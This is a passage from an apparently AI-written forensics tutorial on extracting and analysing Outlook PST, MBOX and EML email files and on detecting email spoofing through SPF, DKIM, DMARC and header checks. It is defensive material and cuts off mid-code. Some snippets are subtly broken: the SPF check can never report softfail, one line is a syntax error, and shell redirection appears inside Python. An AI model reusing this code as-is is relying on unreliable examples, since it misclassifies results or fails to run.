[Unverified] Commercial tools like Kernel PST Viewer provide GUI-based analysis, but open-source alternatives are sufficient for most forensic needs.

**Extracting PST Contents**

**Extract all emails:**

```bash
# Extract to individual EML files
readpst -D -e -o extracted_emails/ mailbox.pst

# Parameters:
# -D: Include deleted items
# -e: EML format (standard email format)
# -o: Output directory
```

**Extract attachments:**

```bash
# Attachments extracted to separate directory
readpst -D -e -o extracted/ mailbox.pst
find extracted/ -name "*.attach" -type f
```

**Extract calendar items:**

```bash
pffexport -m events -t calendar_export/ mailbox.pst
```

**Extract contacts:**

```bash
pffexport -m contacts -t contacts_export/ mailbox.pst
```

**Deleted Item Recovery**

PST files retain deleted items until compacted:

```bash
# Include deleted items in extraction
readpst -D -o recovered/ mailbox.pst
```

Deleted items characteristics:

- Marked as deleted in database
- Content remains until overwritten
- May have incomplete metadata

**Advanced recovery:**

```bash
# Use pffexport with recovery mode
pffexport -m all -f items -t recovered_all/ mailbox.pst
```

**PST Password Protection**

PST files can be password-protected:

**Detection:**

```bash
pffinfo mailbox.pst | grep -i "encryption"
```

Output shows encryption status:

- None: No encryption
- Compressible: Basic XOR obfuscation (not true encryption)
- High: Strong encryption

**Password recovery:**

[Unverified] PST password recovery tools exist but their effectiveness depends on password complexity. Basic XOR "encryption" in older PST files is trivial to bypass and should not be considered actual security.

For forensic access to legitimately encrypted PST files, legal authority to compel password disclosure is typically necessary.

**PST Metadata Analysis**

Extract timestamps and sender/recipient data:

```python
import pypff
import datetime

def analyze_pst_metadata(pst_file):
    pst = pypff.file()
    pst.open(pst_file)
    
    root = pst.get_root_folder()
    
    def process_folder(folder, level=0):
        indent = "  " * level
        print(f"{indent}Folder: {folder.name} ({folder.number_of_sub_messages} messages)")
        
        for message in folder.sub_messages:
            subject = message.subject or "(no subject)"
            sender = message.sender_name or "(unknown)"
            timestamp = message.delivery_time
            
            print(f"{indent}  [{timestamp}] From: {sender}")
            print(f"{indent}    Subject: {subject}")
            print(f"{indent}    Size: {message.plain_text_body_size} bytes")
            
            # Analyze attachments
            if message.number_of_attachments > 0:
                print(f"{indent}    Attachments: {message.number_of_attachments}")
                for attachment in message.attachments:
                    print(f"{indent}      - {attachment.name} ({attachment.size} bytes)")
        
        for subfolder in folder.sub_folders:
            process_folder(subfolder, level + 1)
    
    process_folder(root)
    pst.close()

analyze_pst_metadata('mailbox.pst')
```

**Timeline Generation**

Create chronological timeline of email activity:

```bash
# Extract all messages with timestamps
readpst -D -e -o timeline_extract/ mailbox.pst

# Parse timestamps from extracted EML files
find timeline_extract/ -name "*.eml" -type f | while read eml; do
    timestamp=$(grep "^Date:" "$eml" | cut -d' ' -f2-)
    subject=$(grep "^Subject:" "$eml" | cut -d' ' -f2-)
    echo "$timestamp | $subject | $eml"
done | sort > email_timeline.txt
```

**PST Corruption Detection**

Identify damaged PST files:

```bash
# Check file integrity
pffinfo mailbox.pst 2>&1 | grep -i "error\|corrupt"

# Validate structure
scanpst.exe mailbox.pst  # Windows Inbox Repair Tool
```

Corruption indicators:

- Unable to open in Outlook
- Missing folders or messages
- Incomplete extraction
- Parser errors

**Recovery from corrupted PST:**

```bash
# Attempt partial recovery
pffexport -m all -r -t recovered_partial/ corrupted.pst

# -r: Recovery mode, attempts to recover damaged items
```

**OST File Specific Considerations**

OST files identical structure to PST but contain cached server data:

**Key differences:**

- May contain draft messages not on server
- Synchronized state affects completeness
- Multiple OST files for multiple accounts

**Analysis approach:**

```bash
# Treat OST identically to PST
readpst -D -e -o ost_extracted/ outlook.ost

# Compare with server-side mailbox if accessible
# OST may contain deleted items removed from server
```

**PST Carving from Disk Images**

Recover deleted PST files from disk images:

```bash
# Search for PST file signatures
grep -abo "!BDN" disk_image.dd > pst_offsets.txt

# Extract potential PST files
while read offset; do
    dd if=disk_image.dd of=carved_pst_$offset.pst bs=1 skip=$offset count=100000000
done < pst_offsets.txt

# Validate carved files
for pst in carved_pst_*.pst; do
    pffinfo "$pst" && echo "$pst is valid"
done
```

**Large PST File Handling**

Split large PST exports for analysis:

```bash
# Extract by date range
python3 << EOF
import pypff
import sys

pst = pypff.file()
pst.open('large_mailbox.pst')

root = pst.get_root_folder()

def filter_by_date(folder, start_date, end_date):
    for message in folder.sub_messages:
        if start_date <= message.delivery_time <= end_date:
            # Process or export message
            print(f"{message.delivery_time}: {message.subject}")
    
    for subfolder in folder.sub_folders:
        filter_by_date(subfolder, start_date, end_date)

import datetime
start = datetime.datetime(2024, 1, 1)
end = datetime.datetime(2024, 12, 31)

filter_by_date(root, start, end)
pst.close()
EOF
```

**PST Forensic Best Practices**

1. **Preserve original file:**

```bash
cp mailbox.pst evidence_mailbox.pst
sha256sum evidence_mailbox.pst > pst_hash.txt
```

2. **Document PST metadata:**

```bash
pffinfo evidence_mailbox.pst > pst_info.txt
stat evidence_mailbox.pst >> pst_info.txt
```

3. **Extract to standard format:**

```bash
readpst -D -e -o extracted_eml/ evidence_mailbox.pst
```

4. **Generate index:**

```bash
find extracted_eml/ -name "*.eml" -exec grep -H "^Subject:\|^From:\|^Date:" {} \; > email_index.txt
```

5. **Search for keywords:**

```bash
grep -r -i "confidential\|password\|credential" extracted_eml/ > keyword_hits.txt
```

6. **Hash all extracted items:**

```bash
find extracted_eml/ -type f -exec sha256sum {} \; > extracted_hashes.txt
```

## MBOX Format Examination

MBOX is text-based email storage format used by many email clients and Unix systems. Each message separated by "From " line, making it simpler to parse than PST but less structured.

**MBOX Format Structure**

Messages stored sequentially in single file:

```
From sender@example.com Mon Oct 12 14:23:45 2024
[Email headers]

[Email body]

From sender@example.com Mon Oct 12 15:30:12 2024
[Next email headers]

[Next email body]
```

**From Line Format:**

```
From <envelope-sender> <timestamp>
```

Example:

```
From user@example.com Fri Oct 11 14:23:45 2024
```

Not a standard header - it's message separator added by mail system.

**MBOX Variants**

**mboxo:** Original format, "From " in body quoted with ">" **mboxrd:** "From " escaped with ">", ">From " with ">>"  
**mboxcl:** Includes Content-Length header for message size **mboxcl2:** Enhanced Content-Length handling

**Parsing MBOX Files**

**Python mailbox module:**

```python
import mailbox
import email

def parse_mbox(mbox_file):
    mbox = mailbox.mbox(mbox_file)
    
    for idx, message in enumerate(mbox):
        print(f"\n=== Message {idx + 1} ===")
        print(f"From: {message['From']}")
        print(f"To: {message['To']}")
        print(f"Subject: {message['Subject']}")
        print(f"Date: {message['Date']}")
        
        # Get body
        if message.is_multipart():
            for part in message.walk():
                if part.get_content_type() == "text/plain":
                    print(f"Body: {part.get_payload(decode=True).decode('utf-8', errors='ignore')[:200]}...")
        else:
            print(f"Body: {message.get_payload(decode=True).decode('utf-8', errors='ignore')[:200]}...")

parse_mbox('mailbox.mbox')
```

**Extract Individual Messages:**

```python
def extract_mbox_messages(mbox_file, output_dir):
    import os
    mbox = mailbox.mbox(mbox_file)
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    for idx, message in enumerate(mbox):
        eml_filename = f"message_{idx:05d}.eml"
        eml_path = os.path.join(output_dir, eml_filename)
        
        with open(eml_path, 'w') as f:
            f.write(message.as_string())
        
        print(f"Extracted: {eml_filename}")

extract_mbox_messages('mailbox.mbox', 'extracted_messages/')
```

**Command-Line MBOX Parsing:**

```bash
# Count messages in mbox
grep -c "^From " mailbox.mbox

# Extract all From lines (envelope senders)
grep "^From " mailbox.mbox > senders.txt

# Split mbox into individual files
csplit -f message_ -b "%05d.eml" mailbox.mbox '/^From /' '{*}'

# Use formail to process each message
formail -s sh -c 'cat > message_$$.eml' < mailbox.mbox
```

**MBOX Forensic Analysis**

**Timeline Generation:**

```python
def generate_mbox_timeline(mbox_file):
    import dateutil.parser
    mbox = mailbox.mbox(mbox_file)
    
    timeline = []
    for message in mbox:
        date_str = message['Date']
        subject = message['Subject'] or "(no subject)"
        sender = message['From'] or "(unknown)"
        
        try:
            timestamp = dateutil.parser.parse(date_str)
            timeline.append((timestamp, sender, subject))
        except:
            pass
    
    timeline.sort()
    
    for timestamp, sender, subject in timeline:
        print(f"{timestamp} | {sender} | {subject}")

generate_mbox_timeline('mailbox.mbox')
```

**Search for Keywords:**

```bash
# Search across all messages
grep -i "confidential\|password\|urgent" mailbox.mbox -A 5 -B 5 > keyword_hits.txt

# Search specific headers
grep "^Subject:.*urgent" mailbox.mbox -i

# Search message bodies
awk '/^$/{body=1} body{print}; /^From /{body=0}' mailbox.mbox | grep -i "keyword"
```

**Extract Attachments from MBOX:**

```python
def extract_mbox_attachments(mbox_file, output_dir):
    import os
    mbox = mailbox.mbox(mbox_file)
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    attachment_count = 0
    for msg_idx, message in enumerate(mbox):
        for part in message.walk():
            if part.get_content_maintype() == 'multipart':
                continue
            if part.get('Content-Disposition') is None:
                continue
            
            filename = part.get_filename()
            if filename:
                filename = f"msg{msg_idx:05d}_{filename}"
                filepath = os.path.join(output_dir, filename)
                
                with open(filepath, 'wb') as f:
                    f.write(part.get_payload(decode=True))
                
                print(f"Extracted attachment: {filename}")
                attachment_count += 1
    
    print(f"\nTotal attachments extracted: {attachment_count}")

extract_mbox_attachments('mailbox.mbox', 'mbox_attachments/')
```

**MBOX Corruption Handling:**

Corrupted mbox files may have:

- Missing "From " separators
- Truncated messages
- Binary data corruption

**Recovery approach:**

```python
def recover_mbox(corrupted_mbox, output_mbox):
    with open(corrupted_mbox, 'r', errors='ignore') as input_file:
        with open(output_mbox, 'w') as output_file:
            current_message = []
            
            for line in input_file:
                if line.startswith('From '):
                    # New message boundary
                    if current_message:
                        output_file.write(''.join(current_message))
                    current_message = [line]
                else:
                    current_message.append(line)
            
            # Write final message
            if current_message:
                output_file.write(''.join(current_message))

recover_mbox('corrupted.mbox', 'recovered.mbox')
```

**Convert MBOX to Other Formats:**

**MBOX to PST:**

```bash
# Using readpst in reverse (requires additional tools)
# More practical: Import into Outlook via GUI
```

**MBOX to Maildir:**

```bash
mb2md -s mailbox.mbox -d ~/Maildir/
```

**MBOX to EML:**

```python
# Already shown in extract_mbox_messages() function above
```

**MBOX Metadata Extraction:**

```python
def extract_mbox_metadata(mbox_file):
    mbox = mailbox.mbox(mbox_file)
    
    metadata = {
        'total_messages': 0,
        'date_range': {'earliest': None, 'latest': None},
        'unique_senders': set(),
        'unique_recipients': set(),
        'total_attachments': 0
    }
    
    import dateutil.parser
    
    for message in mbox:
        metadata['total_messages'] += 1
        
        # Track senders
        if message['From']:
            metadata['unique_senders'].add(message['From'])
        
        # Track recipients
        if message['To']:
            metadata['unique_recipients'].add(message['To'])
        
        # Track date range
        if message['Date']:
            try:
                date = dateutil.parser.parse(message['Date'])
                if not metadata['date_range']['earliest'] or date < metadata['date_range']['earliest']:
                    metadata['date_range']['earliest'] = date
                if not metadata['date_range']['latest'] or date > metadata['date_range']['latest']:
                    metadata['date_range']['latest'] = date
            except:
                pass
        
        # Count attachments
        for part in message.walk():
            if part.get_filename():
                metadata['total_attachments'] += 1
    
    print(f"Total messages: {metadata['total_messages']}")
    print(f"Date range: {metadata['date_range']['earliest']} to {metadata['date_range']['latest']}")
    print(f"Unique senders: {len(metadata['unique_senders'])}")
    print(f"Unique recipients: {len(metadata['unique_recipients'])}")
    print(f"Total attachments: {metadata['total_attachments']}")
    
    return metadata

extract_mbox_metadata('mailbox.mbox')
```

**MBOX Forensic Workflow:**

1. **Preserve and hash original:**

```bash
cp mailbox.mbox evidence_mailbox.mbox
sha256sum evidence_mailbox.mbox > mbox_hash.txt
```

2. **Validate structure:**

```bash
grep -c "^From " evidence_mailbox.mbox
```

3. **Extract messages:**

```python
extract_mbox_messages('evidence_mailbox.mbox', 'extracted/')
```

4. **Generate metadata report:**

```python
extract_mbox_metadata('evidence_mailbox.mbox') > metadata_report.txt
```

5. **Search for relevant content:**

```bash
grep -r -i "keyword1\|keyword2" extracted/ > search_results.txt
```

6. **Extract and analyze attachments:**

```python
extract_mbox_attachments('evidence_mailbox.mbox', 'attachments/')
```

7. **Create timeline:**

```python
generate_mbox_timeline('evidence_mailbox.mbox') > timeline.txt
```

## EML File Parsing

EML (Electronic Mail) format stores individual email messages as plain text files following RFC 5322 standard. Each EML file contains one complete email with headers and body.

**EML File Structure**

EML files are human-readable text:

```
Return-Path: <sender@example.com>
Delivered-To: recipient@target.com
Received: from mail.example.com...
From: sender@example.com
To: recipient@target.com
Subject: Test Email
Date: Fri, 11 Oct 2024 14:23:45 -0700
Message-ID: <abc123@example.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Email body content here.
```

**Parsing EML Files**

**Python email module:**

```python
import email

def parse_eml(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    # Extract headers
    print(f"From: {msg['From']}")
    print(f"To: {msg['To']}")
    print(f"Subject: {msg['Subject']}")
    print(f"Date: {msg['Date']}")
    print(f"Message-ID: {msg['Message-ID']}")
    
    # Extract body
    if msg.is_multipart():
        for part in msg.walk():
            if part.get_content_type() == "text/plain":
                body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                print(f"\nBody:\n{body}")
    else:
        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
        print(f"\nBody:\n{body}")

parse_eml('message.eml')
```

**Extract All Headers:**

```python
def extract_all_headers(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    print("=== All Headers ===")
    for header, value in msg.items():
        print(f"{header}: {value}")

extract_all_headers('message.eml')
```

**Command-Line EML Parsing:**

```bash
# Extract specific header
grep "^From:" message.eml

# Extract all headers (up to first blank line)
sed '/^$/q' message.eml

# Extract body (after first blank line)
sed '1,/^$/d' message.eml

# Extract and decode Subject
grep "^Subject:" message.eml | cut -d' ' -f2-
```

**Batch EML Analysis:**

```python
import os
import email

def analyze_eml_directory(directory):
    results = []
    
    for filename in os.listdir(directory):
        if filename.endswith('.eml'):
            filepath = os.path.join(directory, filename)
            
            with open(filepath, 'r') as f:
                msg = email.message_from_file(f)
            
            results.append({
                'filename': filename,
                'from': msg['From'],
                'to': msg['To'],
                'subject': msg['Subject'],
                'date': msg['Date'],
                'has_attachments': any(part.get_filename() for part in msg.walk())
            })
    
    # Print summary
    print(f"Analyzed {len(results)} EML files")
    for result in sorted(results, key=lambda x: x['date'] or ''):
        attachments = " [ATTACHMENTS]" if result['has_attachments'] else ""
        print(f"{result['date']} | {result['from']} | {result['subject']}{attachments}")
    
    return results

analyze_eml_directory('eml_collection/')
```

**EML Attachment Extraction:**

```python
def extract_eml_attachments(eml_file, output_dir):
    import os
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    for part in msg.walk():
        filename = part.get_filename()
        if filename:
            filepath = os.path.join(output_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(part.get_payload(decode=True))
            
            print(f"Extracted: {filename}")

extract_eml_attachments('message.eml', 'attachments/')
```

**EML to HTML Conversion:**

Convert email to viewable HTML:

```python
def eml_to_html(eml_file, html_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    html_parts = []
    for part in msg.walk():
        if part.get_content_type() == 'text/html':
            html_parts.append(part.get_payload(decode=True).decode('utf-8', errors='ignore'))
    
    if html_parts:
        with open(html_file, 'w') as f:
            f.write(''.join(html_parts))
        print(f"Converted to HTML: {html_file}")
    else:
        print("No HTML content found in email")

eml_to_html('message.eml', 'message.html')
```

**EML Forensic Analysis:**

```python
def forensic_eml_analysis(eml_file):
    import hashlib
    import json
    
    with open(eml_file, 'rb') as f:
        content = f.read()
        file_hash = hashlib.sha256(content).hexdigest()
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    analysis = {
        'file_hash': file_hash,
        'filename': eml_file,
        'headers': {},
        'authentication': {},
        'structure': {},
        'attachments': [],
        'anomalies': []
    }
    
    # Extract key headers
    for header in ['From', 'To', 'Subject', 'Date', 'Message-ID', 'Return-Path']:
        analysis['headers'][header] = msg[header]
    
    # Extract authentication headers
    analysis['authentication']['spf'] = msg.get('Received-SPF', 'Not found')
    analysis['authentication']['dkim'] = msg.get('DKIM-Signature', 'Not found')
    analysis['authentication']['dmarc'] = msg.get('Authentication-Results', 'Not found')
    
    # Analyze structure
    analysis['structure']['multipart'] = msg.is_multipart()
    analysis['structure']['content_type'] = msg.get_content_type()
    
    # Extract attachments
    for part in msg.walk():
        filename = part.get_filename()
        if filename:
            payload = part.get_payload(decode=True)
            analysis['attachments'].append({
                'filename': filename,
                'content_type': part.get_content_type(),
                'size': len(payload) if payload else 0,
                'sha256': hashlib.sha256(payload).hexdigest() if payload else None
            })
    
    # Check for anomalies
    if not msg['Message-ID']:
        analysis['anomalies'].append("Missing Message-ID")
    
    if msg['From'] and msg['Return-Path']:
        from_addr = email.utils.parseaddr(msg['From'])[1]
        return_path = msg['Return-Path'].strip('<>')
        if from_addr != return_path:
            analysis['anomalies'].append(f"From/Return-Path mismatch: {from_addr} vs {return_path}")
    
    # Output analysis
    print(json.dumps(analysis, indent=2))
    
    return analysis

forensic_eml_analysis('suspicious.eml')
```

**EML Header Chain Analysis:**

```python
def analyze_received_chain(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    received_headers = msg.get_all('Received')
    if not received_headers:
        print("No Received headers found")
        return
    
    print("=== Message Path (chronological order) ===\n")
    
    # Reverse to show chronological order
    for idx, received in enumerate(reversed(received_headers)):
        print(f"Hop {idx + 1}:")
        print(f"{received}\n")
        
        # Extract IP addresses
        import re
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', received)
        if ips:
            print(f"  IP addresses: {', '.join(ips)}")
        
        # Extract timestamps
        timestamps = re.findall(r'\d{1,2} \w{3} \d{4} \d{2}:\d{2}:\d{2}', received) if timestamps: print(f" Timestamp: {timestamps[0]}")

    print()

analyze_received_chain('message.eml')
````

**EML Validation:**

```python
def validate_eml_structure(eml_file):
    issues = []
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    # Check required headers
    required_headers = ['From', 'Date']
    for header in required_headers:
        if not msg[header]:
            issues.append(f"Missing required header: {header}")
    
    # Check Message-ID format
    if msg['Message-ID']:
        message_id = msg['Message-ID']
        if not (message_id.startswith('<') and message_id.endswith('>')):
            issues.append("Malformed Message-ID (missing < >)")
    
    # Check date format
    if msg['Date']:
        import email.utils
        try:
            email.utils.parsedate_to_datetime(msg['Date'])
        except:
            issues.append("Invalid Date format")
    
    # Check MIME structure
    if msg.is_multipart():
        if not msg.get_boundary():
            issues.append("Multipart message missing boundary")
    
    if issues:
        print("Validation issues found:")
        for issue in issues:
            print(f"  - {issue}")
    else:
        print("EML file structure valid")
    
    return issues

validate_eml_structure('message.eml')
````

**Bulk EML Operations:**

```bash
#!/bin/bash
# Process directory of EML files

EML_DIR="evidence_emails/"
OUTPUT_DIR="analysis_output/"

mkdir -p "$OUTPUT_DIR"

# Extract all senders
find "$EML_DIR" -name "*.eml" -exec grep "^From:" {} \; | sort | uniq -c > "$OUTPUT_DIR/senders.txt"

# Extract all subjects
find "$EML_DIR" -name "*.eml" -exec grep "^Subject:" {} \; > "$OUTPUT_DIR/subjects.txt"

# Generate hash list
find "$EML_DIR" -name "*.eml" -exec sha256sum {} \; > "$OUTPUT_DIR/eml_hashes.txt"

# Search for keywords
grep -r -i "urgent\|confidential\|password" "$EML_DIR" > "$OUTPUT_DIR/keyword_hits.txt"

echo "Analysis complete. Results in $OUTPUT_DIR"
```

**EML Comparison:**

Compare two EML files for differences:

```python
def compare_eml_files(eml1, eml2):
    import difflib
    
    with open(eml1, 'r') as f:
        content1 = f.readlines()
    
    with open(eml2, 'r') as f:
        content2 = f.readlines()
    
    diff = difflib.unified_diff(content1, content2, 
                                fromfile=eml1, tofile=eml2, lineterm='')
    
    print("=== Differences ===")
    for line in diff:
        print(line)

compare_eml_files('original.eml', 'modified.eml')
```

## Email Spoofing Detection

Email spoofing forges sender information to impersonate legitimate sources. Detection requires examining authentication mechanisms and identifying inconsistencies.

**Types of Email Spoofing**

**Display Name Spoofing:**

```
From: "CEO John Smith" <attacker@evil.com>
```

Legitimate-looking display name with fraudulent email address. Users seeing only display name may be deceived.

**Domain Spoofing:**

```
From: ceo@legitcompany.com
```

Forged sender domain without proper authentication. Possible when:

- Victim domain lacks SPF/DKIM/DMARC
- Attacker controls DNS for lookalike domain
- Receiving server doesn't validate authentication

**Lookalike Domain Spoofing:**

```
From: ceo@legitcornpany.com  (note: 'rn' instead of 'm')
From: ceo@legit-company.com
From: ceo@legitcompany.co
```

Similar domain to legitimate one using:

- Character substitution (rn vs m, vv vs w)
- Added hyphens or subdomains
- Alternative TLDs (.co, .net instead of .com)

**Reply-To Manipulation:**

```
From: legitimate@company.com
Reply-To: attacker@evil.com
```

From appears legitimate but replies directed to attacker address.

**SPF Validation**

Sender Policy Framework verifies sending IP authorized for domain.

**Check SPF Record:**

```bash
# Query SPF record
dig +short TXT example.com | grep "v=spf1"

# Example SPF record:
# "v=spf1 ip4:192.168.1.0/24 include:_spf.google.com -all"
```

SPF mechanisms:

- **ip4/ip6**: Authorized IP addresses
- **include**: Include another domain's SPF
- **a/mx**: Authorized if matches A/MX records
- **all**: Default policy

SPF qualifiers:

- **+** (pass): Authorize
- **-** (fail): Reject
- **~** (softfail): Accept but mark suspicious
- **?** (neutral): No policy

**Analyze SPF Results in Email:**

```python
def check_spf_authentication(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    spf_header = msg.get('Received-SPF', '')
    
    if not spf_header:
        print("WARNING: No SPF validation header found")
        return None
    
    print(f"SPF Result: {spf_header}")
    
    if 'pass' in spf_header.lower():
        print("Status: PASS - Sender IP authorized")
    elif 'fail' in spf_header.lower():
        print("Status: FAIL - Sender IP NOT authorized (likely spoofed)")
    elif 'softfail' in spf_header.lower():
        print("Status: SOFTFAIL - Sender IP questionable")
    elif 'neutral' in spf_header.lower():
        print("Status: NEUTRAL - No SPF policy or indeterminate")
    elif 'none' in spf_header.lower():
        print("Status: NONE - Domain has no SPF record")
    
    return spf_header

check_spf_authentication('suspicious.eml')
```

**DKIM Validation**

DomainKeys Identified Mail cryptographically signs emails.

**Examine DKIM Signature:**

```python
def analyze_dkim_signature(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    dkim_sig = msg.get('DKIM-Signature', '')
    
    if not dkim_sig:
        print("WARNING: No DKIM signature found")
        return None
    
    print("=== DKIM Signature ===")
    print(dkim_sig)
    
    # Parse DKIM parameters
    import re
    
    params = {}
    for match in re.finditer(r'(\w+)=([^;]+)', dkim_sig):
        params[match.group(1)] = match.group(2).strip()
    
    print("\n=== DKIM Parameters ===")
    if 'd' in params:
        print(f"Signing Domain (d=): {params['d']}")
    if 's' in params:
        print(f"Selector (s=): {params['s']}")
    if 'a' in params:
        print(f"Algorithm (a=): {params['a']}")
    if 'h' in params:
        print(f"Signed Headers (h=): {params['h']}")
    
    # Check authentication results
    auth_results = msg.get('Authentication-Results', '')
    if 'dkim=pass' in auth_results.lower():
        print("\nStatus: PASS - Signature valid")
    elif 'dkim=fail' in auth_results.lower():
        print("\nStatus: FAIL - Signature invalid (message modified or forged)")
    
    return params

analyze_dkim_signature('message.eml')
```

**Verify DKIM Manually:**

```bash
# Install dkimpy
pip3 install dkimpy

# Verify DKIM signature
python3 -c "
import dkim
with open('message.eml', 'rb') as f:
    message = f.read()
    result = dkim.verify(message)
    print('DKIM Verification:', 'PASS' if result else 'FAIL')
"
```

**DMARC Policy Check**

DMARC validates SPF/DKIM alignment with From domain.

**Query DMARC Record:**

```bash
# Check DMARC policy
dig +short TXT _dmarc.example.com

# Example DMARC record:
# "v=DMARC1; p=reject; rua=mailto:dmarc@example.com; pct=100; adkim=s; aspf=s"
```

DMARC parameters:

- **v=DMARC1**: Version
- **p=**: Policy (none/quarantine/reject)
- **sp=**: Subdomain policy
- **pct=**: Percentage of messages to apply policy
- **adkim=**: DKIM alignment mode (r=relaxed, s=strict)
- **aspf=**: SPF alignment mode
- **rua=**: Aggregate report email
- **ruf=**: Forensic report email

**Analyze DMARC Results:**

```python
def check_dmarc_authentication(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    auth_results = msg.get('Authentication-Results', '')
    
    if not auth_results:
        print("WARNING: No Authentication-Results header found")
        return None
    
    print("=== Authentication Results ===")
    print(auth_results)
    
    if 'dmarc=pass' in auth_results.lower():
        print("\nDMARC Status: PASS - Authentication successful")
    elif 'dmarc=fail' in auth_results.lower():
        print("\nDMARC Status: FAIL - Authentication failed (likely spoofed)")
    else:
        print("\nDMARC Status: No DMARC validation found")
    
    # Extract From domain
    from_header = msg['From']
    import email.utils
    from_addr = email.utils.parseaddr(from_header)[1]
    from_domain = from_addr.split('@')[1] if '@' in from_addr else None
    
    if from_domain:
        print(f"\nFrom Domain: {from_domain}")
        
        # Check DMARC policy
        import subprocess
        try:
            dmarc_record = subprocess.check_output(
                ['dig', '+short', 'TXT', f'_dmarc.{from_domain}'],
                text=True
            ).strip()
            print(f"DMARC Policy: {dmarc_record}")
        except:
            print("DMARC Policy: Unable to query")

check_dmarc_authentication('message.eml')
```

**Header Inconsistency Detection**

**From vs Return-Path Mismatch:**

```python
def check_from_returnpath_consistency(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    from_header = msg['From']
    return_path = msg['Return-Path']
    
    import email.utils
    from_addr = email.utils.parseaddr(from_header)[1] if from_header else None
    return_addr = return_path.strip('<>') if return_path else None
    
    print(f"From: {from_addr}")
    print(f"Return-Path: {return_addr}")
    
    if from_addr and return_addr:
        if from_addr.lower() != return_addr.lower():
            print("\nWARNING: From and Return-Path mismatch")
            print("This may indicate spoofing or forwarding")
            return False
        else:
            print("\nFrom and Return-Path match")
            return True
    else:
        print("\nWARNING: Missing From or Return-Path header")
        return None

check_from_returnpath_consistency('message.eml')
```

**Received Header Analysis:**

```python
def detect_spoofing_via_received_headers(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    received_headers = msg.get_all('Received')
    if not received_headers:
        print("WARNING: No Received headers found")
        print("This is highly suspicious - legitimate emails always have Received headers")
        return
    
    print(f"Number of Received headers: {len(received_headers)}")
    
    # Extract originating server info
    if received_headers:
        first_received = received_headers[-1]  # Last in list = first added
        print(f"\nOriginating server:")
        print(first_received)
        
        # Extract IP addresses
        import re
        ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', first_received)
        
        if ips:
            originating_ip = ips[0]
            print(f"\nOriginating IP: {originating_ip}")
            
            # Check if IP matches expected location for claimed sender
            # [Inference] This would require external geolocation/ASN databases
            print("Verify this IP belongs to claimed sender's organization")

detect_spoofing_via_received_headers('message.eml')
```

**Lookalike Domain Detection:**

```python
def detect_lookalike_domains(eml_file, legitimate_domain):
    import difflib
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    from_header = msg['From']
    import email.utils
    from_addr = email.utils.parseaddr(from_header)[1]
    email_domain = from_addr.split('@')[1] if '@' in from_addr else None
    
    if not email_domain:
        print("Unable to extract domain from From header")
        return
    
    print(f"Email domain: {email_domain}")
    print(f"Legitimate domain: {legitimate_domain}")
    
    # Check exact match
    if email_domain.lower() == legitimate_domain.lower():
        print("Domain matches exactly")
    else:
        # Calculate similarity
        similarity = difflib.SequenceMatcher(None, 
                                            email_domain.lower(), 
                                            legitimate_domain.lower()).ratio()
        
        print(f"Domain similarity: {similarity:.2%}")
        
        if similarity > 0.8:
            print("\nWARNING: Highly similar domain detected")
            print("This may be a lookalike/typosquatting domain")
            
            # Identify differences
            print("\nDifferences:")
            for i, (c1, c2) in enumerate(zip(email_domain, legitimate_domain)):
                if c1 != c2:
                    print(f"  Position {i}: '{c1}' vs '{c2}'")
            
            # Check length difference
            if len(email_domain) != len(legitimate_domain):
                print(f"  Length: {len(email_domain)} vs {len(legitimate_domain)}")

detect_lookalike_domains('suspicious.eml', 'legitimate-company.com')
```

**Display Name vs Email Address Check:**

```python
def check_display_name_spoofing(eml_file):
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    from_header = msg['From']
    
    import email.utils
    display_name, email_addr = email.utils.parseaddr(from_header)
    
    print(f"Display Name: {display_name}")
    print(f"Email Address: {email_addr}")
    
    if display_name and email_addr:
        # Check if display name contains different email address
        import re
        emails_in_display = re.findall(r'[\w\.-]+@[\w\.-]+', display_name)
        
        if emails_in_display:
            print(f"\nWARNING: Email address found in display name: {emails_in_display}")
            if emails_in_display[0].lower() != email_addr.lower():
                print("Display name shows different email than actual sender")
                print("This is a common spoofing technique")
        
        # Check if display name suggests authority but email doesn't match
        authority_keywords = ['ceo', 'cfo', 'president', 'director', 'manager', 'admin']
        display_lower = display_name.lower()
        
        if any(keyword in display_lower for keyword in authority_keywords):
            email_domain = email_addr.split('@')[1] if '@' in email_addr else ''
            print(f"\nDisplay name suggests authority position")
            print(f"Verify that domain '{email_domain}' is legitimate for this sender")

check_display_name_spoofing('phishing.eml')
```

**Comprehensive Spoofing Detection:**

```python
def comprehensive_spoofing_check(eml_file):
    print("=== COMPREHENSIVE EMAIL SPOOFING ANALYSIS ===\n")
    
    with open(eml_file, 'r') as f:
        msg = email.message_from_file(f)
    
    warnings = []
    
    # 1. Check authentication headers
    print("1. AUTHENTICATION CHECK")
    spf = msg.get('Received-SPF', '')
    dkim_auth = msg.get('Authentication-Results', '')
    
    if 'fail' in spf.lower():
        warnings.append("SPF validation failed")
        print("  ❌ SPF: FAIL")
    elif 'pass' in spf.lower():
        print("  ✓ SPF: PASS")
    else:
        warnings.append("No SPF validation")
        print("  ⚠ SPF: Not validated")
    
    if 'dkim=pass' in dkim_auth.lower():
